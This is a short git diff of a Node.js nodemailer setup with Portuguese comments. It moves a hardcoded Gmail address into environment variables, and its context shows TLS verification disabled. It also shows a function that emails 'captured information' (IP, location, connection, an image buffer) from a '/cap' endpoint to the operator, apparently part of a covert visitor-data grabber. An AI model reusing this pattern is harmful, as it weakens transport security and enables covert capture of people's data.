@@ -13,7 +13,7 @@ const transporter = nodemailer.createTransport({
   service: "gmail", // Ou outro serviço de e-mail que você estiver usando
   auth: {
     user: process.env.EMAIL_USER, // Substitua pelo seu e-mail
-    pass: process.env.EMAIL_PASSWORD, // Substitua pela sua senha
+    pass: process.env.EMAIL_PASS, // Substitua pela sua senha
   },
   tls: {
     rejectUnauthorized: false, // Adicione isso caso você tenha problemas com conexões TLS
@@ -23,8 +23,8 @@ const transporter = nodemailer.createTransport({
 // Função para enviar e-mail
 function sendEmail(ip, location, connection, imageBuffer) {
   const mailOptions = {
-    from: "asaserroa@gmail.com", // Usando variável de ambiente
-    to: "asaserroa@gmail.com", // Usando variável de ambiente
+    from: process.env.EMAIL_USER, // Usando variável de ambiente
+    to: process.env.EMAIL_USER, // Usando variável de ambiente
     subject: "Informações Capturadas - Endpoint /cap",
     text: `Informações Capturadas:
     IP: ${ip}`,
